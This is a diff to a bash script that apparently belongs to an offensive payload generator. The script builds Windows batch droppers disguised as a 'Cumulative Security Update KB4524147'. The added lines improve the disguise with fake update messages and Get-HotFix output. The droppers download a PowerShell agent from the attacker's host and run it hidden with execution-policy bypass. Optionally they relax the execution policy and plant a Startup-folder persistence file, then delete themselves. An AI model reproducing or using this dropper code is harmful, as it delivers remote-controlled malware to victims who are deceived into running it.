@@ -12227,7 +12227,7 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : $rpath\\\\$NaM.ps1
-    PERSISTENCE ID: { $random_name }
+    BUILD ID : { $random_name }
 !
 echo "---"
 
@@ -12240,16 +12240,20 @@ persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you
 if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.bat
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
-   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
-   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
-   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat   
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution.
 else
    ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}";sleep 2
    echo "@echo off" > $IPATH/output/$Drop.bat
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
-   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
+   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
@@ -12258,7 +12262,7 @@ else
    echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-   echo "echo PoWeRsHeLl Get-HotFix >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+   echo "echo PoWeRsHeLl Get-HotFix -Description 'Security Update' >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
@@ -12448,7 +12452,7 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.$ext.bat
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : $rpath\\\\$NaM.ps1
-    PERSISTENCE ID: { $random_name }
+    BUILD ID : { $random_name }
 !
 echo "---"
 
@@ -12461,16 +12465,20 @@ persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you
 if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat 
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 else
    ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.$ext.bat ..${white}";sleep 2
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
+   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.$ext.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
